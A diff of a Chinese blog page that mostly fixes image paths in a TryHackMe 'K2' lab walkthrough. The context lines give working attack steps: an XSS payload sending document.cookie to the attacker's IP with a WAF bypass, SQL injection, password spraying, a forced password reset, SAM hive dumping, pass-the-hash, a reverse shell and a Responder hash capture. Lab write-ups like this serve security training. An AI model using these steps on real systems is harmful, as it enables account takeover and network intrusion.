@@ -149,25 +149,25 @@
   isToc: true,
   isShuoshuo: false
 }</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/toutou.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/b.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">rrc4'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">tryhackme-k2 Writeup</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">tryhackme-k2 Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-21T08:41:52.000Z" title="发表于 2024-11-21 16:41:52">2024-11-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-21T09:04:57.955Z" title="更新于 2024-11-21 17:04:57">2024-11-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91/">内网</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="Base-Camp"><a href="#Base-Camp" class="headerlink" title="Base Camp"></a>Base Camp</h2><p>首先进行端口扫描和目录扫描对k2.thm   是个静态页面也没啥关键信息</p>
-<img src="/posts/k2.htm/k2/image-20241120163843364-17321785481751.png" class title="image-20241120163843364">
+<img src="/posts/k2/k2/image-20241120163843364-17321785481751.png" class title="image-20241120163843364">
 
 <p>试着爆破子域名，使用fuff</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w D:\tools\DICT\PasswordDic\域名字典\subnames-9.5w.txt -u http://k2.thm/  -H &quot;HOST:FUZZ.k2.thm&quot;  -fw 811</span><br></pre></td></tr></table></figure>
 
-<img src="/posts/k2.htm/k2/image-20241120164312180-17321785481762.png" class title="image-20241120164312180">
+<img src="/posts/k2/k2/image-20241120164312180-17321785481762.png" class title="image-20241120164312180">
 
 <p>接着对域名和ip绑定</p>
-<img src="/posts/k2.htm/k2/image-20241120164354363-17321785481763.png" class title="image-20241120164354363">
+<img src="/posts/k2/k2/image-20241120164354363-17321785481763.png" class title="image-20241120164354363">
 
 <p>访问两个页面 前面内容大差不差</p>
-<img src="/posts/k2.htm/k2/image-20241120164450089-17321785481764.png" class title="image-20241120164450089">
+<img src="/posts/k2/k2/image-20241120164450089-17321785481764.png" class title="image-20241120164450089">
 
 <p>admin登录不进去 我们先注册个用户普通用户进去</p>
 <p>进去之后是个文本框</p>
-<img src="/posts/k2.htm/k2/image-20241120164609353-17321785481765.png" class title="image-20241120164609353">
+<img src="/posts/k2/k2/image-20241120164609353-17321785481765.png" class title="image-20241120164609353">
 
 <p>抓包测试一下看眼参数，先简单测试一下sql注入好像没有</p>
-<img src="/posts/k2.htm/k2/image-20241120165310813-17321785481766.png" class title="image-20241120165310813">
+<img src="/posts/k2/k2/image-20241120165310813-17321785481766.png" class title="image-20241120165310813">
 
 <p>接着测试xss，在本地先启一个python服务</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
@@ -176,33 +176,33 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://10.11.112.0/test&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://10.11.112.0/tesaaat&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
 <p>收到回显信息</p>
-<img src="/posts/k2.htm/k2/image-20241120165638372-17321785481767.png" class title="image-20241120165638372">
+<img src="/posts/k2/k2/image-20241120165638372-17321785481767.png" class title="image-20241120165638372">
 
 <p>Cooke中有jwt   </p>
-<img src="/posts/k2.htm/k2/image-20241120165734263-17321785481768.png" class title="image-20241120165734263">
+<img src="/posts/k2/k2/image-20241120165734263-17321785481768.png" class title="image-20241120165734263">
 
 <p>xss打cookie 拿管理员cookie 登录管理员的账户</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href = &#x27;http://10.11.112.0/Stealer.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
 <p>遇到了waf</p>
-<img src="/posts/k2.htm/k2/image-20241120170223660-17321785481769.png" class title="image-20241120170223660">
+<img src="/posts/k2/k2/image-20241120170223660-17321785481769.png" class title="image-20241120170223660">
 
 <p>拼接字符串绕过一下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var a=&#x27;coo&#x27;+&#x27;kie&#x27;;location.href = &#x27;http://10.11.112.0/Stealer.php?cookie=&#x27;+document[a]&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-<img src="/posts/k2.htm/k2/image-20241120170430967-173217854817610.png" class title="image-20241120170430967">
+<img src="/posts/k2/k2/image-20241120170430967-173217854817610.png" class title="image-20241120170430967">
 
 <p>拿到cookie</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session=eyJhZG1pbl91c2VybmFtZSI6ImphbWVzIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.Zz2mDA.AFoaTxXB-4wtIweMsTBG4e9VZg0</span><br></pre></td></tr></table></figure>
 
 <p>接着我们带上cookie去访问admin的后台</p>
-<img src="/posts/k2.htm/k2/image-20241120170633302-173217854817611.png" class title="image-20241120170633302">
+<img src="/posts/k2/k2/image-20241120170633302-173217854817611.png" class title="image-20241120170633302">
 
 <p>查询功能点测一测sql注入   </p>
-<img src="/posts/k2.htm/k2/image-20241120193838090-173217854817612.png" class title="image-20241120193838090">
+<img src="/posts/k2/k2/image-20241120193838090-173217854817612.png" class title="image-20241120193838090">
 
 <p>加‘直接爆500 加上注释符号正常，存在sql注入</p>
-<img src="/posts/k2.htm/k2/image-20241120193927655-173217854817613.png" class title="image-20241120193927655">
+<img src="/posts/k2/k2/image-20241120193927655-173217854817613.png" class title="image-20241120193927655">
 
 <p>sqlmap跑一下试试（不知道为啥sqlmap出不来）</p>
 <p>手注 得到一些用户密码</p>
@@ -211,64 +211,64 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">james:Pwd@9tLNrC3!,rose:VrMAogdfxW!9,bob:PasSW0Rd321,steve:St3veRoxx32,cait:PartyAlLDaY!32,xu:L0v3MyDog!3!,ash:PikAchu!IshoesU!</span><br></pre></td></tr></table></figure>
 
 <p>试着用注出来的密码远程登录一下</p>
-<img src="/posts/k2.htm/k2/image-20241120210317894-173217854817614.png" class title="image-20241120210317894">
+<img src="/posts/k2/k2/image-20241120210317894-173217854817614.png" class title="image-20241120210317894">
 
-<img src="/posts/k2.htm/k2/image-20241120210353330-173217854817615.png" class title="image-20241120210353330">
+<img src="/posts/k2/k2/image-20241120210353330-173217854817615.png" class title="image-20241120210353330">
 
 <p>拿到user的flag</p>
 <p>查日志文件找rose的相关信息</p>
-<img src="/posts/k2.htm/k2/image-20241120210530943-173217854817616.png" class title="image-20241120210530943">
+<img src="/posts/k2/k2/image-20241120210530943-173217854817616.png" class title="image-20241120210530943">
 
 <p>找到了密码</p>
 <p>因为james权限较低试着切换到rose的用户能不能权限搞一点</p>
-<img src="/posts/k2.htm/k2/image-20241120210641106-173217854817617.png" class title="image-20241120210641106">
+<img src="/posts/k2/k2/image-20241120210641106-173217854817617.png" class title="image-20241120210641106">
 
 <p>密码不太对，试着拿密码登录root的账户，直接拿到root权限</p>
-<img src="/posts/k2.htm/k2/image-20241120210752784-173217854817718.png" class title="image-20241120210752784">
+<img src="/posts/k2/k2/image-20241120210752784-173217854817718.png" class title="image-20241120210752784">
 
 <p>到rose用户目录下看其命令得到rose密码</p>
-<img src="/posts/k2.htm/k2/image-20241120211033713-173217854817719.png" class title="image-20241120211033713">
+<img src="/posts/k2/k2/image-20241120211033713-173217854817719.png" class title="image-20241120211033713">
 
-<img src="/posts/k2.htm/k2/image-20241120211059684-173217854817720.png" class title="image-20241120211059684">
+<img src="/posts/k2/k2/image-20241120211059684-173217854817720.png" class title="image-20241120211059684">
 
 
 
 <h2 id="Middle-Camp"><a href="#Middle-Camp" class="headerlink" title="Middle Camp"></a>Middle Camp</h2><p>首先扫描端口</p>
-<img src="/posts/k2.htm/k2/image-20241120092327583-173217854817721.png" class title="image-20241120092327583">
+<img src="/posts/k2/k2/image-20241120092327583-173217854817721.png" class title="image-20241120092327583">
 
 <p>对服务进行细致扫描</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p 53,139,88,135,445,3268,3389,9389  -Pn  k2.thm</span><br></pre></td></tr></table></figure>
 
-<img src="/posts/k2.htm/k2/image-20241120092659284-173217854817724.png" class title="image-20241120092659284">
+<img src="/posts/k2/k2/image-20241120092659284-173217854817724.png" class title="image-20241120092659284">
 
 <p>对该台主机进行绑定</p>
 <p>结合之前收集到到的用户，做一个简单的用户名字典，枚举用户名</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">j.blod r.bud jamesb rose.b roseb james.b jbud rbud</span><br><span class="line"></span><br><span class="line">kerbrute.exe  userenum  -d k2.thm --dc 10.10.155.99 D:\tools\yonghu.txt</span><br></pre></td></tr></table></figure>
 
-<img src="/posts/k2.htm/k2/image-20241120094151215-173217854817722.png" class title="image-20241120094151215">
+<img src="/posts/k2/k2/image-20241120094151215-173217854817722.png" class title="image-20241120094151215">
 
 <p>上一台机器上拿到了密码，有可能密码复用，尝试密码喷洒</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute.exe  passwordspray --dc 10.10.155.99  -d k2.thm D:\tools\yonghu.txt &quot;vRMkaVgdfxhW!8&quot;</span><br></pre></td></tr></table></figure>
 
-<img src="/posts/k2.htm/k2/image-20241120094548336-173217854817723.png" class title="image-20241120094548336">
+<img src="/posts/k2/k2/image-20241120094548336-173217854817723.png" class title="image-20241120094548336">
 
 <p>之前扫端口开着5985端口，尝试利用winrm连接</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.155.99 -u r.bud -p &#x27;vRMkaVgdfxhW!8&#x27;</span><br></pre></td></tr></table></figure>
 
-<img src="/posts/k2.htm/k2/image-20241120095113136-173217854817725.png" class title="image-20241120095113136">
+<img src="/posts/k2/k2/image-20241120095113136-173217854817725.png" class title="image-20241120095113136">
 
 <p>到user目录下可查看都有哪些用户完成问题二</p>
 <p>查看note_to_james.txt 说了 james的密码不符合规范在原有基础上加了数字和字母，我们用脚本生成一个密码字典</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the base password</span></span><br><span class="line">base_password = <span class="string">&quot;rockyou&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the range of numbers and special characters to be added</span></span><br><span class="line">numbers = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">special_chars = <span class="string">&#x27;!@#$%^&amp;*&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate all combinations of numbers and special characters</span></span><br><span class="line">combinations = <span class="built_in">list</span>(itertools.product(numbers, special_chars))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate all possibilities by adding the number and special character before or after the base password</span></span><br><span class="line">passwords = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num, special <span class="keyword">in</span> combinations:</span><br><span class="line">    <span class="comment"># Add number and special character before the base password</span></span><br><span class="line">    passwords.append(<span class="string">f&quot;<span class="subst">&#123;num&#125;</span><span class="subst">&#123;special&#125;</span><span class="subst">&#123;base_password&#125;</span>&quot;</span>)</span><br><span class="line">    passwords.append(<span class="string">f&quot;<span class="subst">&#123;special&#125;</span><span class="subst">&#123;num&#125;</span><span class="subst">&#123;base_password&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Add number and special character after the base password</span></span><br><span class="line">    passwords.append(<span class="string">f&quot;<span class="subst">&#123;base_password&#125;</span><span class="subst">&#123;num&#125;</span><span class="subst">&#123;special&#125;</span>&quot;</span>)</span><br><span class="line">    passwords.append(<span class="string">f&quot;<span class="subst">&#123;base_password&#125;</span><span class="subst">&#123;special&#125;</span><span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print out all generated passwords</span></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">    <span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>
 
-<p>然后去爆破James的密码     <a href="mailto:&#x6a;&#46;&#x62;&#111;&#108;&#100;&#64;&#107;&#x32;&#46;&#x74;&#x68;&#109;">&#x6a;&#46;&#x62;&#111;&#108;&#100;&#64;&#107;&#x32;&#46;&#x74;&#x68;&#109;</a>:#8rockyou</p>
-<img src="/posts/k2.htm/k2/image-20241120095925768-173217854817726.png" class title="image-20241120095925768">
+<p>然后去爆破James的密码     <a href="mailto:&#x6a;&#46;&#98;&#111;&#x6c;&#100;&#64;&#x6b;&#x32;&#46;&#x74;&#104;&#109;">&#x6a;&#46;&#98;&#111;&#x6c;&#100;&#64;&#x6b;&#x32;&#46;&#x74;&#104;&#109;</a>:#8rockyou</p>
+<img src="/posts/k2/k2/image-20241120095925768-173217854817726.png" class title="image-20241120095925768">
 
 <p>接着尝试winrm登录主机看看什么信息，发现该用户没有远程登录权限</p>
 <p>使用 bloodhound收集一下信息</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.155.99 -dc K2Server.k2.thm -u j.bold -p &quot;#8rockyou&quot;  --zip -c ALL -v -d k2.thm</span><br></pre></td></tr></table></figure>
 
-<img src="/posts/k2.htm/k2/image-20241120120353032-173217854817727.png" class title="image-20241120120353032">
+<img src="/posts/k2/k2/image-20241120120353032-173217854817727.png" class title="image-20241120120353032">
 
 <p>可以通过 j.bold 修改j.smith的账号密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc password &quot;j.smith&quot; &quot;password123@&quot; -U &quot;k2.thm&quot;/&quot;j.bold&quot;%&quot;#8rockyou&quot; -S &quot;10.10.50.61&quot;</span><br></pre></td></tr></table></figure>
@@ -276,10 +276,10 @@
 <p>继续尝试winrm登录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.50.61  -u j.smith -p password123@</span><br></pre></td></tr></table></figure>
 
-<img src="/posts/k2.htm/k2/image-20241120122351111-173217854817728.png" class title="image-20241120122351111">
+<img src="/posts/k2/k2/image-20241120122351111-173217854817728.png" class title="image-20241120122351111">
 
 <p>whoami &#x2F;priv 查看权限</p>
-<img src="/posts/k2.htm/k2/image-20241120122649201-173217854817729.png" class title="image-20241120122649201">
+<img src="/posts/k2/k2/image-20241120122649201-173217854817729.png" class title="image-20241120122649201">
 
 <blockquote>
 <p>ackup Operators 组的成员可以备份和还原计算机上的所有文件，而不管保护这些文件的权限如何。Backup Operators 还可以登录和关闭计算机。无法重命名、删除或移除此组。默认情况下，此内置组没有成员，它可以在域控制器上执行备份和还原操作。<br>使用以下命令，我们保存这些哈希值并使用 evil-winrm 下载配置单元</p>
@@ -289,25 +289,25 @@
 <p>通过这两个配置文件 然后dump hash </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump   -sam sam -system system LOCAL</span><br></pre></td></tr></table></figure>
 
-<img src="/posts/k2.htm/k2/image-20241120161349081-173217854817730.png" class title="image-20241120161349081">
+<img src="/posts/k2/k2/image-20241120161349081-173217854817730.png" class title="image-20241120161349081">
 
 <p>通过pth 以高权限登录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.36.204  -u administrator -H &#x27;9545b61858c043477c350ae86c37b32f&#x27;</span><br></pre></td></tr></table></figure>
 
-<img src="/posts/k2.htm/k2/image-20241120162944248-173217854817731.png" class title="image-20241120162944248">
+<img src="/posts/k2/k2/image-20241120162944248-173217854817731.png" class title="image-20241120162944248">
 
 <h2 id="The-Summit"><a href="#The-Summit" class="headerlink" title="The Summit"></a>The Summit</h2><p>第一步扫描端口</p>
-<img src="/posts/k2.htm/k2/image-20241120233553206-173217854817732.png" class title="image-20241120233553206">
+<img src="/posts/k2/k2/image-20241120233553206-173217854817732.png" class title="image-20241120233553206">
 
 <p>没有web服务，依旧是一个域内机器</p>
-<img src="/posts/k2.htm/k2/image-20241120233839777-173217854817733.png" class title="image-20241120233839777">
+<img src="/posts/k2/k2/image-20241120233839777-173217854817733.png" class title="image-20241120233839777">
 
 <p>将K2RootDC.k2.thm 加入host，然后枚举用户名</p>
-<img src="/posts/k2.htm/k2/image-20241120234307098-173217854817734.png" class title="image-20241120234307098">
+<img src="/posts/k2/k2/image-20241120234307098-173217854817734.png" class title="image-20241120234307098">
 
 <p>用上个机器的hash pth到这台机器的admin试试 admin不成功，但是j.smith成功登陆了</p>
 <p>到C:\Scripts&gt; 目录下有一个backup.bat的文件 是一个复制的命令我们查看一下权限</p>
-<img src="/posts/k2.htm/k2/image-20241121104930128-173217854817736.png" class title="image-20241121104930128">
+<img src="/posts/k2/k2/image-20241121104930128-173217854817736.png" class title="image-20241121104930128">
 
 <p>没有权限，但是对文件夹有权限，backup的命令过一段时间就会执行</p>
 <p>我们上传nc反弹个shell回来</p>
@@ -318,7 +318,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\10.11.112.0\test\</span><br></pre></td></tr></table></figure>
 
 <p>responder -I thun0</p>
-<img src="/posts/k2.htm/k2/image-20241121124712204-173217854817735.png" class title="image-20241121124712204">
+<img src="/posts/k2/k2/image-20241121124712204-173217854817735.png" class title="image-20241121124712204">
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o.armstrong::K2:6f2d421690f9bf6f:1376FD55162780B2E87A76EED087C7EE:01010000000000008056CC200F3CDB01A8FEF404999B03940000000002000800310038004D00450001001E00570049004E002D0057003000480057004C0058004A00590053004600390004003400570049004E002D0057003000480057004C0058004A0059005300460039002E00310038004D0045002E004C004F00430041004C0003001400310038004D0045002E004C004F00430041004C0005001400310038004D0045002E004C004F00430041004C00070008008056CC200F3CDB010600040002000000080030003000000000000000000000000021000002C006BF8AC87A9C609AC567291FDB01A5D4968EA07E6D5E9B6BE8B9BF54E3840A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310031002E003100310032002E0030000000000000000000</span><br></pre></td></tr></table></figure>
 
